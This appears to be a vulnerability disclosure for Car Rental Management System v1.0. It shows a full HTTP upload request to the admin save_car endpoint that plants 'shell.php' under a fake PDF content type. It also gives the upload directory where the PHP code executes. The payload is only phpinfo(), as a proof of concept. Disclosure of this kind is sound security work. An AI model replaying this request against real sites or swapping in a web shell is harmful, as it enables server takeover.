# Car Rental Management System v1.0 has arbitrary code execution (RCE)

vendor: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability url: ip/car-rental-management-system/admin/ajax.php?action=save_car

Request package for file upload：

```sql
POST /car-rental-management-system/admin/ajax.php?action=save_car HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/car-rental-management-system/admin/index.php?page=manage_car&id=6
Content-Length: 1107
Content-Type: multipart/form-data; boundary=---------------------------16501296121152
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close

-----------------------------16501296121152
Content-Disposition: form-data; name="id"

6
-----------------------------16501296121152
Content-Disposition: form-data; name="brand"

1
-----------------------------16501296121152
Content-Disposition: form-data; name="model"

1
-----------------------------16501296121152
Content-Disposition: form-data; name="category_id"

6
-----------------------------16501296121152
Content-Disposition: form-data; name="engine_id"

3
-----------------------------16501296121152
Content-Disposition: form-data; name="transmission_id"

3
-----------------------------16501296121152
Content-Disposition: form-data; name="description"

111
-----------------------------16501296121152
Content-Disposition: form-data; name="price"

10
-----------------------------16501296121152
Content-Disposition: form-data; name="qty"

110
-----------------------------16501296121152
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/pdf

JFJF
<?php phpinfo();?>
-----------------------------16501296121152--
```

The files will be uploaded to this directory \admin\assets\uploads\cars_img\
![image](https://user-images.githubusercontent.com/54017627/170957334-c7be6854-91bd-4228-8b61-ae605921f0ca.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/170957514-ef8e3f43-875c-446f-8bf3-dab2547c5ae9.png)
